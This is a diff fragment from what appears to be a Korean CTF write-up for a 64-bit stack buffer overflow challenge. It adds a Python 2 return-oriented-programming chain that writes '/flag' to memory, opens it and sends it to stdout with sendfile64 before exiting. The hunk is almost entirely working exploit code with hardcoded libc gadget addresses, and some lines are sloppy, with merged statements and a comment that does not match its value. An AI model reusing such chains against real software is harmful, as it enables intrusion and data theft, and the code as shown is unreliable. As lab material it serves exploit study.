@@ -64,6 +64,37 @@ p += pack('<Q', 0x00007ffff7de584d) # syscall
 print p
 ```
 
+```
+# sendfile64 0x7ffff7ed6100 # open64 0x7ffff7ed0e50  
+# .date 0x0000000000404030 p = ''
+
+p += "A"*56  
+p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
+p += pack('<Q', 0x0000000000404028) # @ .data  
+p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret  
+p += '/flag'  
+p += pack('<Q', 0x00007ffff7e716eb) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
+p += pack('<Q', 0x0000000000000000) # 0  
+p += pack('<Q', 0x00007ffff7ed0e50) # open64  
+#pop rsi ret
+
+p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
+p += pack('<Q', 0x0000000000000001) # 3  
+p += pack('<Q', 0x00007ffff7f28468) # rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
+p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
+p += pack('<Q', 0x0000000000000001) # 1  
+p += pack('<Q', 0x00007ffff7edc371) # pop rdx ; pop r12 ; ret  
+p += pack('<Q', 0x0000000000000000) # 0  
+p += pack('<Q', 0x0000000000000001) # 1  
+p += pack('<Q', 0x00007ffff7e5f822) # pop rcx; ret  
+p += pack('<Q', 0x0000000000000050) # 80  
+p += pack('<Q', 0x00007ffff7ed6100) # sendfile64  
+p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
+p += pack('<Q', 0x000000000000003c) # 60  
+p += pack('<Q', 0x00007ffff7de584d) # syscall  
+print p
+```
+
 1. ldd로 확인
 ```
 ctf@bufferoverflow_overflowret4_no_excstack_64:/$ ldd ./bufferoverflow_overflowret4_no_excstack_64 
